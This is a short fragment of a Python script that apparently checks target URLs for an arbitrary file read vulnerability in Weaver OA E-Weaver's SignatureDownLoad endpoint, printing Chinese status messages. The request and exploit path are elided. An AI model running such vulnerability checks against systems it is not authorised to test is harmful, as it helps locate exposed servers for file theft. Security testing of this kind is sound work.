...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞")
    try:
        ...
        if response.status_code == 200 and 'files' in response.text:
            print(now_time() + ' [SUCCESS]  存在泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞:{}'.format(exp_url))
        else:
            print(now_time() + " [WARNING]  不存在泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞")
    except:
